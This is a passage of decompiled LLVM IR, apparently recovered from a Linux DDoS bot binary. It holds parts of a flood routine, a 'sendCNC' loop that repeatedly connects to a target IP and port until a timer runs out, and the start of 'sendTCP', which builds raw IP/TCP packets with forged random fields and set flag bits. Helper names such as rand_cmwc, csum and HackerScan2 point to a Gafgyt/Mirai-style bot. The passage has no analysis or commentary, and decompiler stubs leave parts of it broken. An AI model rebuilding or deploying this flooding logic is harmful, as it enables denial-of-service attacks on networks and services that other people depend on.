  %v2_804e559 = inttoptr i32 %v1_804e559 to i32*
  store i32 0, i32* %v2_804e559, align 4
  %v5_804e55b = add i32 %v0_804e553, -24
  %v6_804e55b = inttoptr i32 %v5_804e55b to i32*
  store i32 %v1_804e41b, i32* %v6_804e55b, align 4
  %v0_804e55e = load i32, i32* %edx.global-to-local, align 4
  %v2_804e55e = add i32 %v0_804e553, -28
  %v3_804e55e = inttoptr i32 %v2_804e55e to i32*
  store i32 %v0_804e55e, i32* %v3_804e55e, align 4
  %v5_804e55f = add i32 %v0_804e553, -32
  %v6_804e55f = inttoptr i32 %v5_804e55f to i32*
  store i32 %v4_804e347, i32* %v6_804e55f, align 4
  %v6_804e562 = call i32 @__libc_sendto(i32 %stack_var_-80.0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e562, i32* %eax.global-to-local, align 4
  %v1_804e56a = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  %sext3 = mul i32 %v1_804e56a, 65536
  %v1_804e56f = sdiv i32 %sext3, 65536
  store i32 %v1_804e56f, i32* %edx.global-to-local, align 4
  store i32 %v1_804e453, i32* %eax.global-to-local, align 4
  %v1_804e574 = trunc i32 %v1_804e56f to i16
  store i16 %v1_804e574, i16* %v5_804e456, align 4
  br i1 %v1_804e1ee, label %dec_label_pc_804e588, label %dec_label_pc_804e57d

dec_label_pc_804e57d:                             ; preds = %dec_label_pc_804e54d
  %v1_804e57d = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  br label %dec_label_pc_804e5a0

dec_label_pc_804e588:                             ; preds = %dec_label_pc_804e54d
  store i32 %v1_804e58b.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804e590 = load i32, i32* @esp, align 4
  %v2_804e593 = add i32 %v0_804e590, -16
  %v3_804e593 = inttoptr i32 %v2_804e593 to i32*
  store i32 %v1_804e58b.pre-phi, i32* %v3_804e593, align 4
  %v1_804e594 = sext i16 %stack_var_-94.0 to i32
  %v2_804e594 = call i32 @htons(i32 %v1_804e594)
  br label %dec_label_pc_804e5a0

dec_label_pc_804e5a0:                             ; preds = %dec_label_pc_804e57d, %dec_label_pc_804e588
  %storemerge.in = phi i32 [ %v1_804e57d, %dec_label_pc_804e57d ], [ %v2_804e594, %dec_label_pc_804e588 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804e453, i32* %eax.global-to-local, align 4
  %v4_804e5a3 = urem i32 %storemerge.in, 65536
  %v5_804e5a3 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e5a3 = and i32 %v5_804e5a3, -65536
  %v7_804e5a3 = or i32 %v6_804e5a3, %v4_804e5a3
  store i32 %v7_804e5a3, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804e4ed, align 2
  %sext13 = mul i32 %storemerge.in, 65536
  %v1_804e5ab = sdiv i32 %sext13, 65536
  %v2_804e5ab = call i32 @rand_cmwc(i32 %v1_804e5ab)
  %sext4 = mul i32 %v2_804e5ab, 65536
  %v1_804e5b0 = sdiv i32 %sext4, 65536
  store i32 %v1_804e5b0, i32* %edx.global-to-local, align 4
  store i32 %v2_804e43b, i32* @eax, align 4
  %v1_804e5b5 = trunc i32 %v1_804e5b0 to i16
  store i16 %v1_804e5b5, i16* %v4_804e5b5, align 4
  %v0_804e5b9 = load i32, i32* @esp, align 4
  %v5_804e5bc = add i32 %v0_804e5b9, -16
  %v6_804e5bc = inttoptr i32 %v5_804e5bc to i32*
  store i32 %storemerge6, i32* %v6_804e5bc, align 4
  %v2_804e5bf = call i32 @HackerScan2(i32 %v1_804e5ab)
  store i32 %v2_804e5bf, i32* %eax.global-to-local, align 4
  %v0_804e5c4 = load i32, i32* @esp, align 4
  %v3_804e5ca = inttoptr i32 %v0_804e5c4 to i32*
  store i32 %v2_804e5bf, i32* %v3_804e5ca, align 4
  %v0_804e5cb = call i32 @htonl()
  store i32 %v0_804e5cb, i32* %edx.global-to-local, align 4
  store i32 %v0_804e5cb, i32* %v3_804e5d8, align 4
  store i32 %v2_804e43b, i32* %eax.global-to-local, align 4
  %v3_804e5de = load i16, i16* %v2_804e50f, align 2
  %v4_804e5de = zext i16 %v3_804e5de to i32
  store i32 %v4_804e5de, i32* %edx.global-to-local, align 4
  store i32 %v2_804e43b, i32* %eax.global-to-local, align 4
  %v1_804e5ed = load i32, i32* @esp, align 4
  %v2_804e5ed = add i32 %v1_804e5ed, -4
  %v3_804e5ed = inttoptr i32 %v2_804e5ed to i32*
  store i32 %v4_804e5de, i32* %v3_804e5ed, align 4
  %v0_804e5ee = load i32, i32* %eax.global-to-local, align 4
  %v2_804e5ee = add i32 %v1_804e5ed, -8
  %v3_804e5ee = inttoptr i32 %v2_804e5ee to i32*
  store i32 %v0_804e5ee, i32* %v3_804e5ee, align 4
  %v3_804e5ef = inttoptr i32 %v1_804e5ab to i16*
  %v4_804e5ef = call i32 @csum(i16* %v3_804e5ef, i32 ptrtoint (i32* @0 to i32))
  %v5_804e5ef = trunc i32 %v4_804e5ef to i16
  %sext16 = mul i32 %v4_804e5ef, 65536
  %v1_804e5f7 = sdiv i32 %sext16, 65536
  store i32 %v1_804e5f7, i32* %edx.global-to-local, align 4
  store i16 %v5_804e5ef, i16* %v4_804e52d, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804e603 = icmp eq i32 %stack_var_-80.0, %arg6
  %v1_804e606 = icmp eq i1 %v15_804e603, false
  br i1 %v1_804e606, label %dec_label_pc_804e626, label %dec_label_pc_804e608

dec_label_pc_804e608:                             ; preds = %dec_label_pc_804e5a0
  %v0_804e608 = load i32, i32* @esp, align 4
  %v1_804e60b = add i32 %v0_804e608, -16
  %v2_804e60b = inttoptr i32 %v1_804e60b to i32*
  store i32 0, i32* %v2_804e60b, align 4
  %v2_804e60d = inttoptr i32 %v1_804e5ab to i32*
  %v3_804e60d = call i32 @__GI_time(i32* %v2_804e60d)
  store i32 %v3_804e60d, i32* %eax.global-to-local, align 4
  %v0_804e612 = load i32, i32* @esp, align 4
  %v1_804e612 = add i32 %v0_804e612, 16
  %v8_804e618 = icmp sgt i32 %v3_804e60d, %v5_804e53e
  br i1 %v8_804e618, label %dec_label_pc_804e62e, label %dec_label_pc_804e54d

dec_label_pc_804e626:                             ; preds = %dec_label_pc_804e5a0
  %v4_804e626 = add i32 %stack_var_-80.0, 1
  %v0_804e553.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e54d

dec_label_pc_804e62e:                             ; preds = %dec_label_pc_804e608, %dec_label_pc_804e396, %dec_label_pc_804e358
  %v0_804e63727 = phi i32 [ %v3_804e3a4, %dec_label_pc_804e396 ], [ %v3_804e366, %dec_label_pc_804e358 ], [ %v3_804e60d, %dec_label_pc_804e608 ]
  br label %dec_label_pc_804e631

dec_label_pc_804e631:                             ; preds = %dec_label_pc_804e315, %dec_label_pc_804e288, %dec_label_pc_804e213, %dec_label_pc_804e26d, %dec_label_pc_804e62e
  %v0_804e637 = phi i32 [ 0, %dec_label_pc_804e288 ], [ %v4_804e220, %dec_label_pc_804e213 ], [ %v3_804e27b, %dec_label_pc_804e26d ], [ %v0_804e63727, %dec_label_pc_804e62e ], [ %v2_804e31a, %dec_label_pc_804e315 ]
  store i32 %v0_804e1e0, i32* @ebx, align 4
  ret i32 %v0_804e637

; uselistorder directives
  uselistorder i32 %v0_804e5cb, { 1, 0 }
  uselistorder i32 %v1_804e5b0, { 1, 0 }
  uselistorder i32 %v1_804e5ab, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v1_804e56f, { 1, 0 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_804e553, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e509, { 1, 0 }
  uselistorder i32 %v4_804e4ea, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804e58b.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804e4d2, { 2, 1, 0 }
  uselistorder i32 %v1_804e4b6, { 1, 0 }
  uselistorder i32 %v1_804e497, { 1, 0 }
  uselistorder i32 %v2_804e43b, { 8, 7, 6, 5, 16, 15, 14, 4, 3, 13, 2, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 %v2_804e411, { 1, 0 }
  uselistorder i32 %v4_804e347, { 0, 2, 1, 3, 4 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %v1_804e290, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804e28b, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804e25c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e216, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804e1fe, { 1, 0 }
  uselistorder i32 %v12_804e1e1, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e631, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804e5a0, { 1, 0 }
  uselistorder label %dec_label_pc_804e54d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e4e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e418, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804e3ba, { 1, 0 }
  uselistorder label %dec_label_pc_804e315, { 1, 0 }
  uselistorder label %dec_label_pc_804e2e1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e213, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_804e643 = call i32 @__GI_time(i32* null)
  %v5_804e64b = add i32 %v2_804e643, %arg3
  %v1_804e658 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e66c = urem i32 %arg2, 65536
  %v1_804e675 = call i32 @htons(i32 %v1_804e66c)
  %v2_804e697 = ptrtoint i32* %stack_var_-28 to i32
  %v2_804e6cb19 = call i32 @__GI_time(i32* null)
  %v5_804e6d622 = icmp slt i32 %v2_804e6cb19, %v5_804e64b
  br i1 %v5_804e6d622, label %dec_label_pc_804e683, label %dec_label_pc_804e6d8

dec_label_pc_804e683:                             ; preds = %entry, %dec_label_pc_804e683
  %v3_804e68c = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804e6a3 = call i32 @__libc_connect(i32 %v3_804e68c, i32 %v2_804e697, i32 16)
  %v1_804e6b0 = call i32 @sleep(i32 1)
  %v1_804e6be = call i32 @__libc_close(i32 %v3_804e68c)
  %v2_804e6cb = call i32 @__GI_time(i32* null)
  %v5_804e6d6 = icmp slt i32 %v2_804e6cb, %v5_804e64b
  br i1 %v5_804e6d6, label %dec_label_pc_804e683, label %dec_label_pc_804e6d8

dec_label_pc_804e6d8:                             ; preds = %dec_label_pc_804e683, %entry
  %v2_804e6cb.lcssa = phi i32 [ %v2_804e6cb19, %entry ], [ %v2_804e6cb, %dec_label_pc_804e683 ]
  ret i32 %v2_804e6cb.lcssa

; uselistorder directives
  uselistorder i32 %v5_804e64b, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804e683, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp48 = call i16 @__decompiler_undefined_function_4()
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804e6de = load i32, i32* @esi, align 4
  %v0_804e6df = load i32, i32* @ebx, align 4
  %v15_804e6e0 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e6f7 = icmp eq i32 %arg2, 0
  %v1_804e6fb = icmp eq i1 %v4_804e6f7, false
  br i1 %v1_804e6fb, label %dec_label_pc_804e708, label %dec_label_pc_804e6fd

dec_label_pc_804e6fd:                             ; preds = %entry
  %v1_804e6fd = call i32 @rand_cmwc(i32 %v15_804e6e0)
  store i32 %v1_804e6fd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e720

dec_label_pc_804e708:                             ; preds = %entry
  %v1_804e70b = urem i32 %arg2, 65536
  store i32 %v1_804e70b, i32* %eax.global-to-local, align 4
  %v5_804e710 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804e710, i1* %cf.global-to-local, align 1
  %v1_804e714 = call i32 @htons(i32 %v1_804e70b)
  store i32 %v1_804e714, i32* %eax.global-to-local, align 4
  %v0_804e719 = load i32, i32* @esp, align 4
  %v2_804e719 = icmp ugt i32 %v0_804e719, -17
  store i1 %v2_804e719, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e720

dec_label_pc_804e720:                             ; preds = %dec_label_pc_804e6fd, %dec_label_pc_804e708
  %v2_804e723 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804e726 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804e726, i1* %cf.global-to-local, align 1
  %v15_804e726 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804e726, i32* %eax.global-to-local, align 4
  %v4_804e72d = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804e72d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e735 = icmp eq i32 %v4_804e72d, 0
  br i1 %v1_804e735, label %dec_label_pc_804e73e, label %dec_label_pc_804ec61

dec_label_pc_804e73e:                             ; preds = %dec_label_pc_804e720
  %v15_804e741 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804e741, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804e751 = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804e751, i1* %cf.global-to-local, align 1
  %v4_804e75a = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804e75a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e765 = icmp eq i32 %v4_804e75a, 0
  %v1_804e769 = icmp eq i1 %v4_804e765, false
  br i1 %v1_804e769, label %dec_label_pc_804e786, label %dec_label_pc_804e76b

dec_label_pc_804e76b:                             ; preds = %dec_label_pc_804e73e
  %v0_804e76b = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804e76b, i32* %eax.global-to-local, align 4
  %v5_804e770 = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804e770, i1* %cf.global-to-local, align 1
  %v3_804e779 = call i32 @HackerPrint(i32 %v0_804e76b, i32 ptrtoint ([27 x i8]* @global_var_805c7b0.856 to i32))
  store i32 %v3_804e779, i32* %eax.global-to-local, align 4
  %v0_804e77e = load i32, i32* @esp, align 4
  %v2_804e77e = icmp ugt i32 %v0_804e77e, -17
  store i1 %v2_804e77e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec61

dec_label_pc_804e786:                             ; preds = %dec_label_pc_804e73e
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804e78d = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804e78d, i1* %cf.global-to-local, align 1
  %v2_804e792 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804e792, i32* %eax.global-to-local, align 4
  %v5_804e79d = call i32 @__GI_setsockopt(i32 %v4_804e75a, i32 0, i32 3, i32 %v2_804e792, i32 4)
  store i32 %v5_804e79d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804e7a5 = icmp slt i32 %v5_804e79d, 0
  %v1_804e7a7 = icmp eq i1 %v2_804e7a5, false
  br i1 %v1_804e7a7, label %dec_label_pc_804e7c4, label %dec_label_pc_804e7a9

dec_label_pc_804e7a9:                             ; preds = %dec_label_pc_804e786
  %v0_804e7a9 = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804e7a9, i32* %eax.global-to-local, align 4
  %v5_804e7ae = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804e7ae, i1* %cf.global-to-local, align 1
  %v3_804e7b7 = call i32 @HackerPrint(i32 %v0_804e7a9, i32 ptrtoint ([33 x i8]* @global_var_805c7cc.857 to i32))
  store i32 %v3_804e7b7, i32* %eax.global-to-local, align 4
  %v0_804e7bc = load i32, i32* @esp, align 4
  %v2_804e7bc = icmp ugt i32 %v0_804e7bc, -17
  store i1 %v2_804e7bc, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec61

dec_label_pc_804e7c4:                             ; preds = %dec_label_pc_804e786
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e7c4 = icmp eq i32 %arg4, 0
  %v1_804e7c8 = icmp eq i1 %v4_804e7c4, false
  br i1 %v1_804e7c8, label %dec_label_pc_804e7d3, label %dec_label_pc_804e7e9

dec_label_pc_804e7d3:                             ; preds = %dec_label_pc_804e7c4
  %v5_804e7da = sub i32 32, %arg4
  %v10_804e7da = icmp ugt i32 %arg4, 32
  store i1 %v10_804e7da, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804e7e2 = urem i32 %v5_804e7da, 32
  %v4_804e7e2 = icmp eq i32 %v2_804e7e2, 0
  br i1 %v4_804e7e2, label %bb103, label %bb

bb:                                               ; preds = %dec_label_pc_804e7d3
  %v5_804e7e2 = shl i32 1, %v2_804e7e2
  store i32 %v5_804e7e2, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_804e7d3, %bb
  %v0_804e7e4 = phi i32 [ 1, %dec_label_pc_804e7d3 ], [ %v5_804e7e2, %bb ]
  %v1_804e7e4 = sub i32 0, %v0_804e7e4
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804e7e4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7e9

dec_label_pc_804e7e9:                             ; preds = %dec_label_pc_804e7c4, %bb103
  %storemerge13 = phi i32 [ %v1_804e7e4, %bb103 ], [ 0, %dec_label_pc_804e7c4 ]
  %v1_804e7ec = add i32 %arg6, 40
  %v1_804e7f8 = add i32 %arg6, 70
  %v2_804e7fb = and i32 %v1_804e7f8, -16
  %v2_804e801 = sub i32 %v15_804e6e0, %v2_804e7fb
  %v1_804e809 = add i32 %v2_804e801, 15
  %v2_804e80c = and i32 %v1_804e809, -16
  store i32 %v2_804e80c, i32* %edx.global-to-local, align 4
  %v1_804e824 = add i32 %v2_804e80c, 20
  %v5_804e827 = inttoptr i32 %v1_804e824 to i16*
  %v1_804e82d = add i32 %arg6, 20
  store i32 %v1_804e82d, i32* @eax, align 4
  store i32 %v1_804e82d, i32* @ebx, align 4
  %v5_804e832 = icmp ult i32 %v2_804e801, 12
  store i1 %v5_804e832, i1* %cf.global-to-local, align 1
  %v5_804e835 = add i32 %v2_804e801, -16
  %v6_804e835 = inttoptr i32 %v5_804e835 to i32*
  store i32 %storemerge13, i32* %v6_804e835, align 4
  %v1_804e838 = call i32 @HackerScan2(i32 %v1_804e7ec)
  store i32 %v1_804e838, i32* %eax.global-to-local, align 4
  %v0_804e83d = load i32, i32* @esp, align 4
  %v1_804e83d = add i32 %v0_804e83d, 16
  %v5_804e840 = icmp ult i32 %v1_804e83d, 12
  store i1 %v5_804e840, i1* %cf.global-to-local, align 1
  %v3_804e843 = inttoptr i32 %v0_804e83d to i32*
  store i32 %v1_804e838, i32* %v3_804e843, align 4
  %v0_804e844 = call i32 @htonl()
  store i32 %v0_804e844, i32* %eax.global-to-local, align 4
  %v0_804e849 = load i32, i32* @esp, align 4
  %v3_804e84c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804e84c, i32* %edx.global-to-local, align 4
  %tmp106 = and i32 %v0_804e849, -4
  %v5_804e84f = icmp eq i32 %tmp106, -16
  store i1 %v5_804e84f, i1* %cf.global-to-local, align 1
  %v0_804e852 = load i32, i32* @ebx, align 4
  %v2_804e852 = add i32 %v0_804e849, 8
  %v3_804e852 = inttoptr i32 %v2_804e852 to i32*
  store i32 %v0_804e852, i32* %v3_804e852, align 4
  %v1_804e853 = add i32 %v0_804e849, 4
  %v2_804e853 = inttoptr i32 %v1_804e853 to i32*
  store i32 6, i32* %v2_804e853, align 4
  %v3_804e855 = inttoptr i32 %v0_804e849 to i32*
  store i32 %v0_804e844, i32* %v3_804e855, align 4
  %v0_804e856 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e856 = add i32 %v0_804e849, -4
  %v3_804e856 = inttoptr i32 %v2_804e856 to i32*
  store i32 %v0_804e856, i32* %v3_804e856, align 4
  %v5_804e857 = add i32 %v0_804e849, -8
  %v6_804e857 = inttoptr i32 %v5_804e857 to i32*
  store i32 %v2_804e80c, i32* %v6_804e857, align 4
  %v0_804e85a = call i32 @makeIPPacket()
  store i32 %v0_804e85a, i32* %eax.global-to-local, align 4
  %v0_804e85f = load i32, i32* @esp, align 4
  %v5_804e85f = icmp ugt i32 %v0_804e85f, -25
  store i1 %v5_804e85f, i1* %cf.global-to-local, align 1
  %v2_804e862 = call i32 @rand_cmwc(i32 %v1_804e824)
  %sext = mul i32 %v2_804e862, 65536
  %v1_804e867 = sdiv i32 %sext, 65536
  store i32 %v1_804e867, i32* %edx.global-to-local, align 4
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  %v1_804e86c = trunc i32 %v1_804e867 to i16
  store i16 %v1_804e86c, i16* %v5_804e827, align 4
  %v2_804e86f = call i32 @rand_cmwc(i32 %v1_804e824)
  %v2_804e879 = add i32 %v2_804e80c, 24
  %v3_804e879 = inttoptr i32 %v2_804e879 to i32*
  store i32 %v2_804e86f, i32* %v3_804e879, align 8
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  %v1_804e87f = add i32 %v2_804e80c, 28
  %v2_804e87f = inttoptr i32 %v1_804e87f to i32*
  store i32 0, i32* %v2_804e87f, align 4
  store i32 %v1_804e824, i32* %edx.global-to-local, align 4
  %v1_804e889 = add i32 %v2_804e80c, 32
  %v2_804e889 = inttoptr i32 %v1_804e889 to i8*
  %v3_804e889 = load i8, i8* %v2_804e889, align 16
  %v1_804e88c = urem i8 %v3_804e889, 16
  %v1_804e88f = or i8 %v1_804e88c, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804e88f, i8* %v2_804e889, align 16
  %v4_804e895 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804e895, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e895, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c7ed.858 to i32), i32* @edi, align 4
  %v6_804e8b3 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c7ed.858, i32 0, i32 0), i32 4)
  %v7_804e8b3 = urem i32 %v6_804e8b3, 2
  %v8_804e8b3 = icmp eq i32 %v7_804e8b3, 0
  %v0_804e8b5 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e8b5 = or i1 %v0_804e8b5, %v8_804e8b3
  %v3_804e8b5 = zext i1 %v2_804e8b5 to i32
  %v4_804e8b5 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e8b5 = and i32 %v4_804e8b5, -256
  %v6_804e8b5 = or i32 %v3_804e8b5, %v5_804e8b5
  %v7_804e8b5 = xor i32 %v6_804e8b5, 1
  store i32 %v7_804e8b5, i32* @edx, align 4
  %v3_804e8bb = and i32 %v6_804e8b3, -256
  %v1_804e8bd = trunc i32 %v7_804e8b5 to i8
  %v3_804e8bd = zext i1 %v0_804e8b5 to i8
  %v4_804e8bd = sub nsw i8 %v1_804e8bd, %v3_804e8bd
  %v15_804e8bd = icmp eq i8 %v4_804e8bd, 0
  %v20_804e8bd = zext i8 %v4_804e8bd to i32
  %v23_804e8bd = or i32 %v20_804e8bd, %v3_804e8bb
  store i32 %v23_804e8bd, i32* @ecx, align 4
  %v2_804e8c1 = sext i8 %v4_804e8bd to i32
  store i32 %v2_804e8c1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8c6 = icmp eq i1 %v15_804e8bd, false
  br i1 %v1_804e8c6, label %dec_label_pc_804e909, label %dec_label_pc_804e8c8

dec_label_pc_804e8c8:                             ; preds = %dec_label_pc_804e7e9
  store i32 %v1_804e824, i32* %edx.global-to-local, align 4
  %v1_804e8cb = add i32 %v2_804e80c, 33
  %v2_804e8cb = inttoptr i32 %v1_804e8cb to i8*
  %v3_804e8cb = load i8, i8* %v2_804e8cb, align 1
  %v4_804e8cb = zext i8 %v3_804e8cb to i32
  %v6_804e8cb = and i32 %v2_804e8c1, -256
  %v7_804e8cb = or i32 %v6_804e8cb, %v4_804e8cb
  %v1_804e8ce = or i32 %v7_804e8cb, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8ce = trunc i32 %v1_804e8ce to i8
  store i32 %v1_804e8ce, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8ce, i8* %v2_804e8cb, align 1
  store i32 %v1_804e824, i32* %edx.global-to-local, align 4
  %v3_804e8d7 = load i8, i8* %v2_804e8cb, align 1
  %v4_804e8d7 = zext i8 %v3_804e8d7 to i32
  %v5_804e8d7 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8d7 = and i32 %v5_804e8d7, -256
  %v7_804e8d7 = or i32 %v4_804e8d7, %v6_804e8d7
  %v1_804e8da = or i32 %v7_804e8d7, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8da = trunc i32 %v1_804e8da to i8
  store i32 %v1_804e8da, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8da, i8* %v2_804e8cb, align 1
  store i32 %v1_804e824, i32* %edx.global-to-local, align 4
  %v3_804e8e3 = load i8, i8* %v2_804e8cb, align 1
  %v4_804e8e3 = zext i8 %v3_804e8e3 to i32
  %v5_804e8e3 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8e3 = and i32 %v5_804e8e3, -256
  %v7_804e8e3 = or i32 %v4_804e8e3, %v6_804e8e3
  %v1_804e8e6 = or i32 %v7_804e8e3, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8e6 = trunc i32 %v1_804e8e6 to i8
  store i32 %v1_804e8e6, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8e6, i8* %v2_804e8cb, align 1
  store i32 %v1_804e824, i32* %edx.global-to-local, align 4
  %v3_804e8ef = load i8, i8* %v2_804e8cb, align 1
  %v4_804e8ef = zext i8 %v3_804e8ef to i32
  %v5_804e8ef = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8ef = and i32 %v5_804e8ef, -256
  %v7_804e8ef = or i32 %v4_804e8ef, %v6_804e8ef
  %v1_804e8f2 = or i32 %v7_804e8ef, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8f2 = trunc i32 %v1_804e8f2 to i8
  store i32 %v1_804e8f2, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8f2, i8* %v2_804e8cb, align 1
  store i32 %v1_804e824, i32* %edx.global-to-local, align 4
  %v3_804e8fb = load i8, i8* %v2_804e8cb, align 1
  %v4_804e8fb = zext i8 %v3_804e8fb to i32
  %v5_804e8fb = load i32, i32* %eax.global-to-local, align 4
  %v6_804e8fb = and i32 %v5_804e8fb, -256
  %v7_804e8fb = or i32 %v4_804e8fb, %v6_804e8fb
  %v1_804e8fe = or i32 %v7_804e8fb, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e8fe = trunc i32 %v1_804e8fe to i8
  store i32 %v1_804e8fe, i32* %eax.global-to-local, align 4
  store i8 %v3_804e8fe, i8* %v2_804e8cb, align 1
  %v0_804ead5.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804ead5

dec_label_pc_804e909:                             ; preds = %dec_label_pc_804e7e9
  store i32 %v4_804e895, i32* @eax, align 4
  %v0_804e90c = load i32, i32* @esp, align 4
  %v5_804e90c = icmp ult i32 %v0_804e90c, 8
  store i1 %v5_804e90c, i1* %cf.global-to-local, align 1
  %v1_804e90f = add i32 %v0_804e90c, -12
  %v2_804e90f = inttoptr i32 %v1_804e90f to i32*
  store i32 ptrtoint (i32* @global_var_805c7f1.859 to i32), i32* %v2_804e90f, align 4
